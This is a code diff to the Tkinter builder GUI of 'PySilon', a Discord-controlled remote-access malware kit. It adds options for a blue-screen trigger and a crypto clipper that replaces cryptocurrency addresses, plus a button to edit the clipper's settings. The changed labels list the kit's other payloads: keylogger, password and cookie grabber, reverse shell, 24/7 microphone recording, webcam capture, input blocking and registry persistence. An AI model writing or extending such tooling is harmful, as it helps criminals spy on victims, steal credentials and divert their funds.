@@ -4,6 +4,8 @@ from PIL import ImageTk, Image
 import configparser
 import compiler
 import sys
+import os
+import subprocess
 
 window_icon = 'resources/icons/icon.ico'; Image.open('resources/icons/icon.ico').resize((120, 120)).save('icon.png', format='PNG')
 config_path, status = 'configuration.ini', 'configuration'
@@ -25,7 +27,9 @@ filenames = {
     'rev_shl': 'reverse_shell.py',
     'webcam_': 'webcam.py',
     'scrnrec': 'screenrec.py',
-    'inputbl': 'block_input.py'
+    'inputbl': 'block_input.py',
+    'bluesod': 'bsod.py',
+    'crclipr': 'crypto_clipper.py'
 }
 
 default_modules = [
@@ -83,6 +87,8 @@ def load_configuration(is_custom):
     cbvar_webcam.set(config['FUNCTIONALITY']['webcam_'])
     cbvar_scrnrec.set(config['FUNCTIONALITY']['scrnrec'])
     cbvar_inputbl.set(config['FUNCTIONALITY']['inputbl'])
+    cbvar_bluesod.set(config['FUNCTIONALITY']['bluesod'])
+    cbvar_crclipr.set(config['FUNCTIONALITY']['crclipr'])
 
 def reset_configuration():
     server_id.delete(0, END)
@@ -108,6 +114,8 @@ def reset_configuration():
     cbvar_webcam.set(True)
     cbvar_scrnrec.set(True)
     cbvar_inputbl.set(True)
+    cbvar_bluesod.set(True)
+    cbvar_crclipr.set(True)
     cbvar_disclaimer.set(False)
 
     change_icon('resources/icons/icon.ico')
@@ -149,6 +157,8 @@ def save_configuration():
     config['FUNCTIONALITY']['webcam_'] = str(cbvar_webcam.get())
     config['FUNCTIONALITY']['scrnrec'] = str(cbvar_scrnrec.get())
     config['FUNCTIONALITY']['inputbl'] = str(cbvar_inputbl.get())
+    config['FUNCTIONALITY']['bluesod'] = str(cbvar_bluesod.get())
+    config['FUNCTIONALITY']['crclipr'] = str(cbvar_crclipr.get())
 
     with open(config_path, 'w') as configfile:
         config.write(configfile)
@@ -264,10 +274,10 @@ if len(sys.argv) > 1:
         cli = 'soon' # CLI mode will be added soon...
 else:
     root = Tk()
-    root.geometry('700x620')
+    root.geometry('750x660')
     root.resizable(True, True)
     root.iconbitmap('resources/icons/icon.ico')
-    root.title('PySilon builder')
+    root.title('PySilon Builder')
     root.configure(bg='#0A0A10')
     root.tk_setPalette(background='#0A0A10', foreground='white', activeBackground='#0A0A10', activeForeground='white')
 
@@ -281,7 +291,7 @@ else:
     settings_canvas = Canvas(root, width=1, height=1, bd=0)
     Label(settings_canvas, text='General settings:', justify=RIGHT, anchor=E).grid(row=2, padx=(30, 5), pady=(30, 2), sticky=E)
     Label(settings_canvas, text='Server ID*:', justify=RIGHT, anchor=E).grid(row=3, padx=(30, 5), pady=2, sticky=E)
-    Label(settings_canvas, text='BOT Token*:', justify=RIGHT, anchor=E).grid(row=4, padx=(30, 5), pady=2, sticky=E)
+    Label(settings_canvas, text='Bot Token*:', justify=RIGHT, anchor=E).grid(row=4, padx=(30, 5), pady=2, sticky=E)
     Label(settings_canvas, text='Emergency Token 1:', justify=RIGHT, anchor=E).grid(row=5, padx=(30, 5), pady=2, sticky=E)
     Label(settings_canvas, text='Emergency Token 2:', justify=RIGHT, anchor=E).grid(row=6, padx=(30, 5), pady=2, sticky=E)
     Label(settings_canvas, text='Registry Name*:', justify=RIGHT, anchor=E).grid(row=7, padx=(30, 5), pady=2, sticky=E)
@@ -341,22 +351,32 @@ else:
     cbvar_webcam = BooleanVar(value=True)
     cbvar_scrnrec = BooleanVar(value=True)
     cbvar_inputbl = BooleanVar(value=True)
+    cbvar_bluesod = BooleanVar(value=True)
+    cbvar_crclipr = BooleanVar(value=True)
+
+    def open_crypto_clipper_config():
+        json_file_path = 'crypto_clipper.json'
+        if os.path.exists(json_file_path):
+            subprocess.Popen(['notepad.exe', json_file_path])
 
     cb_keylogger = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='keylogger', variable=cbvar_keylogger, command=config_modification, onvalue=True, offvalue=False)
     cb_screenshot = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screenshots', variable=cbvar_screenshot, command=config_modification, onvalue=True, offvalue=False)
-    cb_registry = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='registry injection (start malware every reboot)', variable=cbvar_registry, command=config_modification, onvalue=True, offvalue=False)
+    cb_registry = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='enable on startup (via registry injection)', variable=cbvar_registry, command=config_modification, onvalue=True, offvalue=False)
     cb_file_downloading = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file downloading', variable=cbvar_file_downloading, command=config_modification, onvalue=True, offvalue=False)
     cb_file_uploading = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file uploading', variable=cbvar_file_uploading, command=config_modification, onvalue=True, offvalue=False)
     cb_file_removal = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file removal', variable=cbvar_file_removal, command=config_modification, onvalue=True, offvalue=False)
     cb_file_explorer = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='file exploring', variable=cbvar_file_explorer, command=config_modification, onvalue=True, offvalue=False)
     cb_grabber = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='grabber (WiFi, saved passwords, browser history, cookies, Discord)', variable=cbvar_grabber, command=config_modification, onvalue=True, offvalue=False)
-    cb_live_microphone = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='live microphone (BOT joins voice-channel and plays live mic input)', variable=cbvar_live_microphone, command=config_modification, onvalue=True, offvalue=False)
+    cb_live_microphone = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='live microphone (via discord voice chat)', variable=cbvar_live_microphone, command=config_modification, onvalue=True, offvalue=False)
     cb_microphone_recording = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='24/7 microphone recording (.wav files sent on channel)', variable=cbvar_microphone_recording, command=config_modification, onvalue=True, offvalue=False)
-    cb_processes = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='processes (show list of running processes, kill them)', variable=cbvar_processes, command=config_modification, onvalue=True, offvalue=False)
-    cb_reverse_shell = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='reverse shell (execute remote CMD commands)', variable=cbvar_reverse_shell, command=config_modification, onvalue=True, offvalue=False)
-    cb_webcam = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='webcam images capturing', variable=cbvar_webcam, command=config_modification, onvalue=True, offvalue=False)
+    cb_processes = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='manage processes', variable=cbvar_processes, command=config_modification, onvalue=True, offvalue=False)
+    cb_reverse_shell = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='reverse shell (execute remote cmd commands)', variable=cbvar_reverse_shell, command=config_modification, onvalue=True, offvalue=False)
+    cb_webcam = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='take webcam photos', variable=cbvar_webcam, command=config_modification, onvalue=True, offvalue=False)
     cb_scrnrec = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='screen recording', variable=cbvar_scrnrec, command=config_modification, onvalue=True, offvalue=False)
-    cb_inputbl = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='block inputs (mouse & keyboard)', variable=cbvar_inputbl, command=config_modification, onvalue=True, offvalue=False)
+    cb_inputbl = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='block input (mouse & keyboard)', variable=cbvar_inputbl, command=config_modification, onvalue=True, offvalue=False)
+    cb_bluesod = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='trigger a bsod', variable=cbvar_bluesod, command=config_modification, onvalue=True, offvalue=False)
+    cb_crclipr = Checkbutton(settings_canvas, selectcolor='#0A0A10', text='crypto clipper (replaces crypto addresses)', variable=cbvar_crclipr, command=config_modification, onvalue=True, offvalue=False)
+    json_button = Button(settings_canvas, text='⚙', command=open_crypto_clipper_config)
 
     cb_keylogger.grid(row=3, column=2, sticky=W, padx=(30, 0))
     cb_screenshot.grid(row=4, column=2, sticky=W, padx=(30, 0))
@@ -372,7 +392,10 @@ else:
     cb_processes.grid(row=14, column=2, sticky=W, padx=(30, 0))
     cb_reverse_shell.grid(row=15, column=2, sticky=W, padx=(30, 0))
     cb_inputbl.grid(row=16, column=2, sticky=W, padx=(30, 0))
-    cb_webcam.grid(row=17, column=2, sticky=W, padx=(30, 0), pady=(0, 30))
+    cb_webcam.grid(row=17, column=2, sticky=W, padx=(30, 0))
+    cb_bluesod.grid(row=18, column=2, sticky=W, padx=(30, 0))
+    cb_crclipr.grid(row=19, column=2, sticky=W, padx=(30, 0), pady=(0, 20))
+    json_button.grid(row=19, column=2, padx=(190, 0), pady=(0, 20))
 
     bottom_buttons = Canvas(root, width=1, height=1, bd=0)
     cbvar_disclaimer = BooleanVar(value=False)
